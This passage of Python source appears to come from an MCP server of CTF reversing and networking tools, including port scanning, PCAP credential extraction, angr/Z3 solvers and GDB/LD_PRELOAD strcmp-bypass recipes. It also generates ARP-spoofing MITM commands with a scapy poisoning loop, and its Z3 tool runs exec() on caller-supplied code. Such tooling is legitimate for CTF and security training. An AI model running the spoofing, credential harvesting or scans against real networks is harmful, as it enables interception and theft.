    target = _safe_path(path)
    data = target.read_bytes()

    if len(data) < 16:
        return "[file too short to be a valid .pyc]"

    magic = data[:4]
    magic_num = struct.unpack("<H", magic[:2])[0]

    # Map magic to Python version
    version_map = {
        3360: "3.0", 3361: "3.1", 3379: "3.2", 3393: "3.3", 3410: "3.4",
        3420: "3.4", 3430: "3.5", 3450: "3.6", 3490: "3.7", 3520: "3.8",
        3550: "3.9", 3570: "3.10", 3590: "3.11", 3600: "3.12",
        62211: "2.7", 62121: "2.6", 50428: "2.0", 60202: "2.1",
    }
    py_ver = version_map.get(magic_num, f"unknown (magic=0x{magic_num:04x})")

    out = [
        f"Python .pyc file: {target.name}",
        f"Magic number: 0x{magic_num:04x}  Python version: {py_ver}",
    ]

    # Try to load code object
    try:
        # Handle PEP 552 hash-based pyc (Python 3.8+)
        offset = 16 if data[4:8] in (b'\x00\x00\x00\x00', b'\x01\x00\x00\x00') else 8
        code = marshal.loads(data[offset:])
        out.append(f"\n=== Code object ===")
        out.append(f"  co_filename:  {getattr(code, 'co_filename', 'N/A')}")
        out.append(f"  co_name:      {getattr(code, 'co_name', 'N/A')}")
        out.append(f"  co_consts:    {list(getattr(code, 'co_consts', []))[:20]}")
        out.append(f"  co_names:     {list(getattr(code, 'co_names', []))[:20]}")
        out.append(f"  co_varnames:  {list(getattr(code, 'co_varnames', []))[:20]}")

        # Dis output
        buf = io.StringIO()
        import contextlib
        with contextlib.redirect_stdout(buf):
            dis.dis(code)
        out.append(f"\n=== Bytecode (dis) ===")
        out.append(buf.getvalue()[:3000])
    except Exception as e:
        out.append(f"\n[marshal load failed: {e}]")
        out.append("Falling back to strings:")
        out.append(_truncate(_run(["strings", "-n", "4", str(target)]), 80))

    # Try external decompiler
    decompiled = _run(["uncompyle6", str(target)])
    if "[tool not installed" not in decompiled and "Error" not in decompiled[:30]:
        out.append(f"\n=== Decompiled source (uncompyle6) ===")
        out.append(decompiled[:3000])
    else:
        decompiled2 = _run(["decompile3", str(target)])
        if "[tool not installed" not in decompiled2:
            out.append(f"\n=== Decompiled source (decompile3) ===")
            out.append(decompiled2[:3000])

    return "\n".join(out)


@mcp.tool()
def re_angr_solve(path: str, find_addr: str, avoid_addrs: str = "",
                  stdin_length: int = 32) -> str:
    """Use angr symbolic execution to find an input that reaches find_addr.

    find_addr:   hex address of the success basic block (e.g. 0x401234).
    avoid_addrs: comma-separated hex addresses to avoid (e.g. failure/exit blocks).
    stdin_length: number of symbolic stdin bytes to use (default 32).

    Requires angr (pip install angr). This may be slow for complex binaries —
    set stdin_length to the minimum needed (password length, etc.).
    """
    try:
        import angr, claripy  # type: ignore
    except ImportError:
        return (
            "[angr not installed]\n"
            "Add to requirements.txt:  angr>=9.2\n"
            "Then: docker compose build\n\n"
            "Manual angr template:\n"
            "  import angr, claripy\n"
            "  proj = angr.Project('./binary', auto_load_libs=False)\n"
            "  flag = claripy.BVS('flag', 8*32)\n"
            "  state = proj.factory.full_init_state(stdin=flag)\n"
            "  sm = proj.factory.simulation_manager(state)\n"
            "  sm.explore(find=0xFIND, avoid=[0xAVOID])\n"
            "  if sm.found: print(sm.found[0].posix.dumps(0))"
        )

    target = _safe_path(path)
    find_int  = int(find_addr, 16)
    avoid_int = [int(a.strip(), 16) for a in avoid_addrs.split(",") if a.strip()]

    try:
        proj  = angr.Project(str(target), auto_load_libs=False)
        flag  = claripy.BVS("flag", 8 * stdin_length)
        state = proj.factory.full_init_state(stdin=flag)
        for i in range(stdin_length):
            b = flag.get_byte(i)
            state.add_constraints(b >= 0x20, b <= 0x7e)

        sm = proj.factory.simulation_manager(state)
        sm.explore(find=find_int, avoid=avoid_int)

        if sm.found:
            sol_state = sm.found[0]
            raw = sol_state.posix.dumps(0)
            return (
                f"angr solution found!\n"
                f"Input (raw):   {raw!r}\n"
                f"Input (ascii): {raw.decode('latin-1')}\n"
                f"Input (hex):   {raw.hex()}"
            )
        return "[angr: no solution found — try increasing stdin_length or adjusting addresses]"
    except Exception as e:
        return f"[angr error: {e}]"


@mcp.tool()
def re_z3_constraint_solve(constraints: str) -> str:
    """Solve a system of constraints using the Z3 SMT solver.

    constraints: a Python code block that defines Z3 variables and adds constraints
                 to a Solver named `s`. The solver is pre-created; just add to it.

    Example constraints string:
      x, y = Ints('x y')
      s.add(x + y == 42)
      s.add(x - y == 10)

    Returns the satisfying assignment or 'UNSAT'.
    Requires z3-solver (pip install z3-solver).
    """
    try:
        from z3 import Solver, Int, BitVec, BitVecs, Ints, sat, unsat  # type: ignore
        import z3
    except ImportError:
        return (
            "[z3-solver not installed]\n"
            "Add to requirements.txt: z3-solver>=4.12\n"
            "Then: docker compose build\n\n"
            "Z3 cheat sheet:\n"
            "  x = Int('x')           # integer variable\n"
            "  x = BitVec('x', 32)    # 32-bit bitvector (use for C int overflow)\n"
            "  s.add(x > 0)           # constraint\n"
            "  s.add(x * 3 == 99)\n"
            "  if s.check() == sat: print(s.model())"
        )

    s = Solver()
    # Expose z3 names into exec namespace
    globs = {name: getattr(z3, name) for name in dir(z3)}
    globs["s"] = s

    try:
        exec(constraints, globs)  # noqa: S102
        result = s.check()
        if result == sat:
            model = s.model()
            assignments = "\n".join(
                f"  {d.name()} = {model[d]}" for d in model.decls()
            )
            return f"SAT - solution found:\n{assignments}"
        elif result == unsat:
            return "UNSAT - no solution exists (constraints are contradictory)"
        else:
            return "UNKNOWN - Z3 could not determine satisfiability"
    except Exception as e:
        return f"[exec/solve error: {e}]"


@mcp.tool()
def re_ltrace_strace_hints(path: str, args: str = "") -> str:
    """Generate ltrace and strace command templates for a workspace binary.

    Returns ready-to-run commands for: library call tracing (ltrace),
    system call tracing (strace), and GDB watch/breakpoint recipes — tuned
    for common CTF reversing goals (strcmp interception, open/read tracing,
    mmap watching, etc.).

    Note: ltrace/strace need a live process — use outside the container
    or in an unlocked container (cap_add: SYS_PTRACE in docker-compose).
    """
    target = _safe_path(path)
    name = str(target)
    arg_str = f" {args}" if args else ""

    return f"""\
=== ltrace (library call tracing) ===
ltrace {name}{arg_str}
ltrace -e strcmp,strncmp,memcmp,strcasecmp {name}{arg_str}   # intercept comparisons
ltrace -e '*' -S {name}{arg_str}                              # all lib calls + syscalls
ltrace -C -e '*' {name}{arg_str} 2>&1 | grep -i 'pass\|flag\|key\|secret'

=== strace (system call tracing) ===
strace {name}{arg_str}
strace -e trace=open,openat,read,write,mmap {name}{arg_str}   # file I/O focus
strace -e trace=execve,fork,clone {name}{arg_str}             # process spawning
strace -f {name}{arg_str}                                      # follow forks
strace -yy -e trace=network {name}{arg_str}                   # network calls

=== GDB recipes ===
gdb {name}
(gdb) break strcmp           # stop when strcmp is called
(gdb) commands               # run after each break
(gdb) x/s $rdi               # print arg1 (first string)
(gdb) x/s $rsi               # print arg2 (second string)
(gdb) continue
(gdb) end

# Override strcmp to always return 0 (equal):
(gdb) break strcmp
(gdb) commands
(gdb) return 0
(gdb) end

# Dump memory region after decryption:
(gdb) watch *0xDEADBEEF      # break on write to address
(gdb) dump binary memory /tmp/dump.bin 0xSTART 0xEND

=== LD_PRELOAD hook (bypass strcmp) ===
cat > /tmp/hook.c << 'EOF'
#include <string.h>
#include <stdio.h>
int strcmp(const char *a, const char *b) {{
    fprintf(stderr, "[hook] strcmp(%s, %s)\\n", a, b);
    return 0;  // always equal
}}
EOF
gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c
LD_PRELOAD=/tmp/hook.so {name}{arg_str}
"""


# ===========================================================================
# NETWORKING TOOLBOX
# ===========================================================================

@mcp.tool()
def net_port_scan(host: str, ports: str = "1-1024", timeout: float = 1.0) -> str:
    """TCP connect scan against a host.

    Args:
        host: Target hostname or IP address.
        ports: Port range like "1-1024", comma list "22,80,443", or "top20".
        timeout: Per-port connect timeout in seconds (default 1.0).

    Returns:
        Table of open/closed ports with service hints.
    """
    import socket

    TOP20 = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
             143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

    SERVICES = {
        21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
        80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc",
        139: "netbios", 143: "imap", 443: "https", 445: "smb",
        993: "imaps", 995: "pop3s", 1723: "pptp", 3306: "mysql",
        3389: "rdp", 5432: "postgres", 5900: "vnc", 6379: "redis",
        8080: "http-alt", 8443: "https-alt", 9200: "elasticsearch",
        27017: "mongodb", 6667: "irc", 2181: "zookeeper",
    }

    # Parse port list
    port_list: list[int] = []
    if ports == "top20":
        port_list = TOP20
    else:
        for part in ports.split(","):
            part = part.strip()
            if "-" in part:
                lo, hi = part.split("-", 1)
                port_list.extend(range(int(lo), int(hi) + 1))
            else:
                port_list.append(int(part))

    open_ports: list[tuple[int, str]] = []
    closed = 0

    try:
        resolved = socket.gethostbyname(host)
    except socket.gaierror as exc:
        return f"DNS resolution failed for {host}: {exc}"

    for port in port_list:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((resolved, port))
            svc = SERVICES.get(port, "unknown")
            open_ports.append((port, svc))
            sock.close()
        except (socket.timeout, ConnectionRefusedError, OSError):
            closed += 1
        finally:
            sock.close()

    lines = [f"=== Port scan: {host} ({resolved}) ===",
             f"Scanned {len(port_list)} ports | Open: {len(open_ports)} | Closed/filtered: {closed}", ""]
    if open_ports:
        lines.append(f"{'PORT':<8} {'STATE':<8} SERVICE")
        lines.append("-" * 30)
        for p, s in open_ports:
            lines.append(f"{p:<8} {'open':<8} {s}")
    else:
        lines.append("No open ports found.")
    return "\n".join(lines)


@mcp.tool()
def net_banner_grab(host: str, port: int, timeout: float = 3.0, send_probe: str = "") -> str:
    """Grab the service banner from a TCP port.

    Args:
        host: Target hostname or IP.
        port: TCP port number.
        timeout: Read timeout in seconds.
        send_probe: Optional bytes to send (e.g. "HEAD / HTTP/1.0\\r\\n\\r\\n").

    Returns:
        Raw banner text (printable bytes) and hex dump of first 256 bytes.
    """
    import socket

    try:
        resolved = socket.gethostbyname(host)
    except socket.gaierror as exc:
        return f"DNS resolution failed: {exc}"

    try:
        with socket.create_connection((resolved, port), timeout=timeout) as s:
            if send_probe:
                probe = send_probe.replace("\\r", "\r").replace("\\n", "\n").encode()
                s.sendall(probe)
            s.settimeout(timeout)
            data = b""
            try:
                while len(data) < 4096:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
    except (ConnectionRefusedError, OSError) as exc:
        return f"Connection to {host}:{port} failed: {exc}"

    if not data:
        return f"Connected to {host}:{port} but received no banner."

    printable = data.decode("latin-1", errors="replace")
    hex_lines = []
    for i in range(0, min(256, len(data)), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        hex_lines.append(f"{i:04x}  {hex_part:<48}  {asc_part}")

    return (
        f"=== Banner grab: {host}:{port} ({resolved}) ===\n"
        f"Bytes received: {len(data)}\n\n"
        f"--- Raw (latin-1) ---\n{printable[:2000]}\n\n"
        f"--- Hex dump (first 256 bytes) ---\n" + "\n".join(hex_lines)
    )


@mcp.tool()
def net_dns_lookup(domain: str, record_types: str = "A,AAAA,MX,NS,TXT,CNAME") -> str:
    """Perform DNS lookups for a domain across multiple record types.

    Args:
        domain: Domain name to query.
        record_types: Comma-separated record types to query (A, AAAA, MX, NS, TXT, CNAME, SOA, PTR).

    Returns:
        DNS records grouped by type, plus reverse PTR for each A record.
    """
    result = _run(["nslookup", "-version"], timeout=5)
    use_dig = _run(["which", "dig"], timeout=5).strip() != ""
    lines = [f"=== DNS lookup: {domain} ===\n"]

    for rtype in [r.strip().upper() for r in record_types.split(",")]:
        if use_dig:
            out = _run(["dig", "+short", "+time=3", rtype, domain], timeout=10)
        else:
            out = _run(["nslookup", "-type=" + rtype, domain], timeout=10)
        lines.append(f"--- {rtype} ---")
        lines.append(out.strip() if out.strip() else "(no records)")
        lines.append("")

    # Reverse lookup of A records
    if use_dig:
        a_out = _run(["dig", "+short", "A", domain], timeout=5)
        for ip in a_out.strip().splitlines():
            ip = ip.strip()
            if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                ptr = _run(["dig", "+short", "-x", ip], timeout=5).strip()
                lines.append(f"PTR {ip} → {ptr or '(none)'}")

    return "\n".join(lines)


@mcp.tool()
def net_whois(target: str) -> str:
    """Run WHOIS on a domain or IP address.

    Args:
        target: Domain name or IP address to look up.

    Returns:
        WHOIS response text (truncated to 4 KB).
    """
    out = _run(["whois", target], timeout=20)
    if not out.strip():
        return f"No WHOIS data returned for {target}."
    return _truncate(f"=== WHOIS: {target} ===\n\n" + out, 4096)


@mcp.tool()
def net_http_headers(url: str, method: str = "HEAD", follow_redirects: bool = True) -> str:
    """Fetch and display HTTP response headers for a URL.

    Args:
        url: Target URL (http:// or https://).
        method: HTTP method — HEAD (default) or GET.
        follow_redirects: Whether to follow 3xx redirects (default True).

    Returns:
        Status line, all response headers, and redirect chain if any.
    """
    import warnings
    try:
        import requests
    except ImportError:
        return "requests library not available."

    warnings.filterwarnings("ignore")
    chain = []
    try:
        resp = requests.request(
            method.upper(), url,
            allow_redirects=follow_redirects,
            timeout=10,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (CTF-Recon)"},
            stream=True,
        )
        # Collect redirect chain
        for r in resp.history:
            chain.append(f"  {r.status_code} → {r.headers.get('Location', '?')}")

        lines = [f"=== HTTP Headers: {url} ===",
                 f"Final URL : {resp.url}",
                 f"Status    : {resp.status_code} {resp.reason}"]
        if chain:
            lines.append("Redirects :")
            lines.extend(chain)
        lines.append("\n--- Response Headers ---")
        for k, v in resp.headers.items():
            lines.append(f"  {k}: {v}")

        # Security hints
        hints = []
        h = {k.lower(): v for k, v in resp.headers.items()}
        for hdr in ["strict-transport-security", "content-security-policy",
                    "x-frame-options", "x-content-type-options"]:
            if hdr not in h:
                hints.append(f"  MISSING: {hdr}")
        if hints:
            lines.append("\n--- Security Header Gaps ---")
            lines.extend(hints)

        return "\n".join(lines)
    except Exception as exc:
        return f"Request failed: {exc}"


@mcp.tool()
def net_traceroute(host: str, max_hops: int = 20) -> str:
    """Trace the network path to a host.

    Args:
        host: Target hostname or IP address.
        max_hops: Maximum number of hops (default 20).

    Returns:
        Hop-by-hop trace output.
    """
    # Try traceroute first, fall back to tracepath
    cmd = ["traceroute", "-m", str(max_hops), "-w", "1", host]
    out = _run(cmd, timeout=60)
    if "not found" in out.lower() or "no such" in out.lower():
        out = _run(["tracepath", "-m", str(max_hops), host], timeout=60)
    return _truncate(f"=== Traceroute: {host} ===\n\n" + out, 4096)


@mcp.tool()
def net_pcap_analyze(path: str, display_filter: str = "", limit: int = 50) -> str:
    """Analyze a PCAP/PCAPNG file with tshark.

    Args:
        path: Path to .pcap/.pcapng file (relative to workspace).
        display_filter: Wireshark display filter (e.g. "http", "dns", "tcp.port==80").
        limit: Maximum number of packets to show (default 50).

    Returns:
        Packet summary, protocol hierarchy, and filtered packet list.
    """
    safe = _safe_path(path)

    # Protocol hierarchy
    hier = _run(["tshark", "-r", str(safe), "-q", "-z", "io,phs"], timeout=30)

    # Packet list
    args = ["tshark", "-r", str(safe), "-c", str(limit), "-T", "fields",
            "-e", "frame.number", "-e", "frame.time_relative",
            "-e", "ip.src", "-e", "ip.dst",
            "-e", "_ws.col.Protocol", "-e", "frame.len",
            "-e", "_ws.col.Info",
            "-E", "separator=|"]
    if display_filter:
        args += ["-Y", display_filter]
    packets = _run(args, timeout=30)

    # Conversation stats
    conv = _run(["tshark", "-r", str(safe), "-q", "-z", "conv,tcp"], timeout=30)

    lines = [f"=== PCAP Analysis: {path} ==="]
    lines.append("\n--- Protocol Hierarchy ---")
    lines.append(hier.strip() or "(empty)")
    lines.append("\n--- Packets (frame|time|src|dst|proto|len|info) ---")
    if packets.strip():
        for line in packets.strip().splitlines()[:limit]:
            lines.append("  " + line)
    else:
        lines.append("  (no packets match filter)")
    lines.append("\n--- TCP Conversations ---")
    lines.append(conv.strip() or "(none)")
    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def net_pcap_extract_http(path: str) -> str:
    """Extract HTTP requests and responses from a PCAP file.

    Args:
        path: Path to .pcap/.pcapng file (relative to workspace).

    Returns:
        HTTP methods, URIs, status codes, headers, and body previews.
    """
    safe = _safe_path(path)

    # HTTP request URIs
    uris = _run([
        "tshark", "-r", str(safe), "-Y", "http.request",
        "-T", "fields", "-e", "ip.src", "-e", "http.request.method",
        "-e", "http.request.full_uri", "-e", "http.user_agent",
        "-E", "separator=|"
    ], timeout=30)

    # HTTP responses
    resps = _run([
        "tshark", "-r", str(safe), "-Y", "http.response",
        "-T", "fields", "-e", "ip.src", "-e", "http.response.code",
        "-e", "http.content_type", "-e", "http.content_length",
        "-E", "separator=|"
    ], timeout=30)

    # Credentials (Basic Auth)
    creds = _run([
        "tshark", "-r", str(safe), "-Y", "http.authorization",
        "-T", "fields", "-e", "ip.src", "-e", "http.authorization",
        "-E", "separator=|"
    ], timeout=30)

    lines = [f"=== HTTP Extraction: {path} ===",
             "\n--- Requests (src|method|uri|user-agent) ---"]
    lines.append(uris.strip() or "(no HTTP requests found)")
    lines.append("\n--- Responses (src|status|content-type|length) ---")
    lines.append(resps.strip() or "(no HTTP responses found)")
    if creds.strip():
        lines.append("\n--- Authorization Headers (possible credentials) ---")
        lines.append(creds.strip())
    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def net_pcap_extract_dns(path: str) -> str:
    """Extract all DNS queries and responses from a PCAP file.

    Args:
        path: Path to .pcap/.pcapng file (relative to workspace).

    Returns:
        DNS queries, responses, and any suspicious patterns (data exfil, long labels).
    """
    safe = _safe_path(path)

    queries = _run([
        "tshark", "-r", str(safe), "-Y", "dns.flags.response == 0",
        "-T", "fields", "-e", "frame.time_relative", "-e", "ip.src",
        "-e", "dns.qry.name", "-e", "dns.qry.type",
        "-E", "separator=|"
    ], timeout=30)

    responses = _run([
        "tshark", "-r", str(safe), "-Y", "dns.flags.response == 1",
        "-T", "fields", "-e", "frame.time_relative", "-e", "ip.dst",
        "-e", "dns.qry.name", "-e", "dns.resp.addr",
        "-E", "separator=|"
    ], timeout=30)

    # Detect suspiciously long labels (possible DNS exfiltration)
    suspicious = []
    for line in queries.strip().splitlines():
        parts = line.split("|")
        if len(parts) >= 3:
            name = parts[2]
            labels = name.split(".")
            if any(len(l) > 30 for l in labels) or len(name) > 100:
                suspicious.append(f"  LONG LABEL: {name}")

    lines = [f"=== DNS Extraction: {path} ===",
             "\n--- Queries (time|src|name|type) ---"]
    lines.append(queries.strip() or "(none)")
    lines.append("\n--- Responses (time|dst|name|addr) ---")
    lines.append(responses.strip() or "(none)")
    if suspicious:
        lines.append("\n--- Suspicious (possible DNS exfil) ---")
        lines.extend(suspicious[:50])
    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def net_pcap_extract_creds(path: str) -> str:
    """Hunt for credentials and secrets in a PCAP file.

    Args:
        path: Path to .pcap/.pcapng file (relative to workspace).

    Returns:
        FTP/Telnet/HTTP Basic credentials, cookies, and other auth material.
    """
    safe = _safe_path(path)
    lines = [f"=== Credential Hunt: {path} ===\n"]

    # FTP credentials
    ftp_user = _run([
        "tshark", "-r", str(safe), "-Y", "ftp.request.command == USER or ftp.request.command == PASS",
        "-T", "fields", "-e", "ip.src", "-e", "ftp.request.command", "-e", "ftp.request.arg",
        "-E", "separator=|"
    ], timeout=30)
    if ftp_user.strip():
        lines.append("--- FTP ---")
        lines.append(ftp_user.strip())

    # HTTP Basic Auth
    http_auth = _run([
        "tshark", "-r", str(safe), "-Y", "http.authorization",
        "-T", "fields", "-e", "ip.src", "-e", "http.authorization",
        "-E", "separator=|"
    ], timeout=30)
    if http_auth.strip():
        lines.append("\n--- HTTP Basic Auth ---")
        for line in http_auth.strip().splitlines():
            parts = line.split("|")
            if len(parts) >= 2 and parts[1].lower().startswith("basic "):
                b64 = parts[1][6:].strip()
                try:
                    decoded = base64.b64decode(b64).decode("utf-8", errors="replace")
                    lines.append(f"  {parts[0]} → {decoded}")
                except Exception:
                    lines.append(f"  {line}")
            else:
                lines.append("  " + line)

    # HTTP Cookies
    cookies = _run([
        "tshark", "-r", str(safe), "-Y", "http.cookie",
        "-T", "fields", "-e", "ip.src", "-e", "http.cookie",
        "-E", "separator=|"
    ], timeout=30)
    if cookies.strip():
        lines.append("\n--- HTTP Cookies ---")
        lines.append(_truncate(cookies.strip(), 2000))

    # Telnet data
    telnet = _run([
        "tshark", "-r", str(safe), "-Y", "telnet",
        "-T", "fields", "-e", "ip.src", "-e", "telnet.data",
        "-E", "separator=|"
    ], timeout=30)
    if telnet.strip():
        lines.append("\n--- Telnet Data ---")
        lines.append(_truncate(telnet.strip(), 1000))

    if len(lines) == 2:
        lines.append("No credentials found in common protocols.")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def net_pcap_follow_stream(path: str, stream_index: int = 0, protocol: str = "tcp") -> str:
    """Follow a TCP/UDP stream from a PCAP file (like Wireshark 'Follow Stream').

    Args:
        path: Path to .pcap/.pcapng file (relative to workspace).
        stream_index: Stream index to follow (default 0).
        protocol: "tcp" or "udp" (default "tcp").

    Returns:
        Full reassembled stream content with direction markers.
    """
    safe = _safe_path(path)
    proto = protocol.lower()
    if proto not in ("tcp", "udp"):
        return "protocol must be 'tcp' or 'udp'."

    out = _run([
        "tshark", "-r", str(safe), "-q",
        "-z", f"follow,{proto},ascii,{stream_index}"
    ], timeout=30)

    if not out.strip():
        return f"No {proto.upper()} stream {stream_index} found in {path}."
    return _truncate(f"=== Follow {proto.upper()} Stream #{stream_index}: {path} ===\n\n" + out, 8192)


@mcp.tool()
def net_ssl_info(host: str, port: int = 443) -> str:
    """Retrieve TLS/SSL certificate and cipher information from a host.

    Args:
        host: Target hostname or IP.
        port: TCP port (default 443).

    Returns:
        Certificate subject/issuer/validity, cipher suite, TLS version, and SANs.
    """
    # Use openssl s_client
    out = _run(
        f"echo | openssl s_client -connect {host}:{port} -servername {host} "
        f"-showcerts 2>&1 | openssl x509 -noout -text 2>&1",
        timeout=15, shell=True
    )

    # Also grab the cipher/protocol
    handshake = _run(
        f"echo | openssl s_client -connect {host}:{port} -servername {host} 2>&1 | "
        f"grep -E 'Protocol|Cipher|subject|issuer|Verify'",
        timeout=15, shell=True
    )

    lines = [f"=== TLS/SSL Info: {host}:{port} ===",
             "\n--- Handshake Summary ---",
             handshake.strip() or "(could not connect)",
             "\n--- Certificate Details ---",
             _truncate(out.strip(), 4000)]
    return "\n".join(lines)


@mcp.tool()
def net_decode_packet_hex(hex_data: str, protocol_hint: str = "auto") -> str:
    """Decode a raw packet from hex bytes.

    Parses Ethernet → IP → TCP/UDP/ICMP layers and displays field values.

    Args:
        hex_data: Hex string of raw packet bytes (spaces/colons OK).
        protocol_hint: "ethernet", "ip", "tcp", "udp", or "auto" (default).

    Returns:
        Decoded protocol fields layer by layer.
    """
    raw = bytes.fromhex(re.sub(r"[\s:.-]", "", hex_data))
    lines = [f"=== Packet Decode ({len(raw)} bytes) ===\n"]

    offset = 0

    def read(n: int) -> bytes:
        nonlocal offset
        chunk = raw[offset:offset + n]
        offset += n
        return chunk

    def ipv4_str(b: bytes) -> str:
        return ".".join(str(x) for x in b)

    hint = protocol_hint.lower()

    # Ethernet layer
    if hint in ("auto", "ethernet") and len(raw) >= 14:
        dst_mac = ":".join(f"{b:02x}" for b in read(6))
        src_mac = ":".join(f"{b:02x}" for b in read(6))
        ethertype = int.from_bytes(read(2), "big")
        lines.append("=== Ethernet ===")
        lines.append(f"  Dst MAC   : {dst_mac}")
        lines.append(f"  Src MAC   : {src_mac}")
        lines.append(f"  EtherType : 0x{ethertype:04x} ({('IPv4' if ethertype==0x0800 else 'IPv6' if ethertype==0x86DD else 'ARP' if ethertype==0x0806 else 'unknown')})")
        lines.append("")
        if ethertype != 0x0800:
            lines.append(f"Remaining bytes: {raw[offset:].hex()}")
            return "\n".join(lines)
        hint = "ip"

    # IP layer
    if hint in ("auto", "ip") and len(raw) - offset >= 20:
        ihl_ver = read(1)[0]
        version = ihl_ver >> 4
        ihl = (ihl_ver & 0xF) * 4
        tos = read(1)[0]
        total_len = int.from_bytes(read(2), "big")
        frag_id = int.from_bytes(read(2), "big")
        flags_frag = int.from_bytes(read(2), "big")
        ttl = read(1)[0]
        proto_num = read(1)[0]
        checksum = int.from_bytes(read(2), "big")
        src_ip = ipv4_str(read(4))
        dst_ip = ipv4_str(read(4))
        proto_name = {1: "ICMP", 6: "TCP", 17: "UDP", 41: "IPv6", 89: "OSPF"}.get(proto_num, str(proto_num))
        offset += max(0, ihl - 20)  # skip IP options
        lines.append("=== IPv4 ===")
        lines.append(f"  Version   : {version}")
        lines.append(f"  IHL       : {ihl} bytes")
        lines.append(f"  TOS       : 0x{tos:02x}")
        lines.append(f"  Total Len : {total_len}")
        lines.append(f"  ID        : 0x{frag_id:04x}")
        lines.append(f"  TTL       : {ttl}")
        lines.append(f"  Protocol  : {proto_num} ({proto_name})")
        lines.append(f"  Checksum  : 0x{checksum:04x}")
        lines.append(f"  Src IP    : {src_ip}")
        lines.append(f"  Dst IP    : {dst_ip}")
        lines.append("")

        # TCP
        if proto_num == 6 and len(raw) - offset >= 20:
            src_port = int.from_bytes(read(2), "big")
            dst_port = int.from_bytes(read(2), "big")
            seq = int.from_bytes(read(4), "big")
            ack = int.from_bytes(read(4), "big")
            data_off_flags = int.from_bytes(read(2), "big")
            data_off = ((data_off_flags >> 12) & 0xF) * 4
            flags_val = data_off_flags & 0x1FF
            flag_names = []
            for bit, name in [(0x100, "NS"), (0x80, "CWR"), (0x40, "ECE"),
                              (0x20, "URG"), (0x10, "ACK"), (0x08, "PSH"),
                              (0x04, "RST"), (0x02, "SYN"), (0x01, "FIN")]:
                if flags_val & bit:
                    flag_names.append(name)
            window = int.from_bytes(read(2), "big")
            chk = int.from_bytes(read(2), "big")
            urg = int.from_bytes(read(2), "big")
            payload = raw[offset + max(0, data_off - 20):]
            lines.append("=== TCP ===")
            lines.append(f"  Src Port  : {src_port}")
            lines.append(f"  Dst Port  : {dst_port}")
            lines.append(f"  Seq       : {seq}")
            lines.append(f"  Ack       : {ack}")
            lines.append(f"  Data Off  : {data_off}")
            lines.append(f"  Flags     : 0x{flags_val:03x} ({' '.join(flag_names) or 'none'})")
            lines.append(f"  Window    : {window}")
            lines.append(f"  Checksum  : 0x{chk:04x}")
            if payload:
                lines.append(f"\n--- TCP Payload ({len(payload)} bytes) ---")
                lines.append(payload.decode("latin-1", errors="replace")[:500])

        # UDP
        elif proto_num == 17 and len(raw) - offset >= 8:
            src_port = int.from_bytes(read(2), "big")
            dst_port = int.from_bytes(read(2), "big")
            length = int.from_bytes(read(2), "big")
            chk = int.from_bytes(read(2), "big")
            payload = raw[offset:]
            lines.append("=== UDP ===")
            lines.append(f"  Src Port  : {src_port}")
            lines.append(f"  Dst Port  : {dst_port}")
            lines.append(f"  Length    : {length}")
            lines.append(f"  Checksum  : 0x{chk:04x}")
            if payload:
                lines.append(f"\n--- UDP Payload ({len(payload)} bytes) ---")
                lines.append(payload.decode("latin-1", errors="replace")[:500])

        # ICMP
        elif proto_num == 1 and len(raw) - offset >= 4:
            icmp_type = read(1)[0]
            icmp_code = read(1)[0]
            chk = int.from_bytes(read(2), "big")
            rest = raw[offset:]
            icmp_names = {0: "Echo Reply", 3: "Dest Unreachable", 8: "Echo Request",
                         11: "Time Exceeded", 30: "Traceroute"}
            lines.append("=== ICMP ===")
            lines.append(f"  Type      : {icmp_type} ({icmp_names.get(icmp_type, 'unknown')})")
            lines.append(f"  Code      : {icmp_code}")
            lines.append(f"  Checksum  : 0x{chk:04x}")
            if rest:
                lines.append(f"  Data      : {rest.hex()}")

    elif hint in ("auto", "ip"):
        # Treat raw as bare IP or unknown
        lines.append(f"Raw bytes: {raw.hex()}")

    return "\n".join(lines)


@mcp.tool()
def net_arp_spoof_explain(target_ip: str, gateway_ip: str, interface: str = "eth0") -> str:
    """Generate ARP spoofing command templates for MITM (educational/CTF use).

    Args:
        target_ip: IP of the victim host.
        gateway_ip: IP of the default gateway.
        interface: Network interface name (default eth0).

    Returns:
        ARP spoof commands with explanation of the attack flow.
    """
    return f"""=== ARP Spoofing Reference ===
Target  : {target_ip}
Gateway : {gateway_ip}
Iface   : {interface}

=== Attack Flow ===
1. Attacker sends gratuitous ARP replies to BOTH victim and gateway.
2. Victim ARP cache: gateway IP → attacker MAC
3. Gateway ARP cache: victim IP → attacker MAC
4. All traffic between victim ↔ gateway flows through attacker (MITM).
5. Enable IP forwarding so victim stays connected: echo 1 > /proc/sys/net/ipv4/ip_forward

=== arpspoof (dsniff) ===
# Terminal 1 — poison victim (tell victim attacker is gateway)
arpspoof -i {interface} -t {target_ip} {gateway_ip}

# Terminal 2 — poison gateway (tell gateway attacker is victim)
arpspoof -i {interface} -t {gateway_ip} {target_ip}

=== scapy (Python) ===
from scapy.all import *
import threading, time

def spoof(target, spoof_as):
    pkt = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_as)
    send(pkt, verbose=False)

while True:
    spoof("{target_ip}", "{gateway_ip}")   # lie to victim
    spoof("{gateway_ip}", "{target_ip}")   # lie to gateway
    time.sleep(2)

=== Capture with tcpdump ===
tcpdump -i {interface} host {target_ip} -w /tmp/mitm.pcap

=== ettercap ===
ettercap -T -q -i {interface} -M arp:remote /{target_ip}// /{gateway_ip}//

=== Restore (send correct ARP) ===
from scapy.all import *
# Get real MACs first with: arping -c1 <ip>
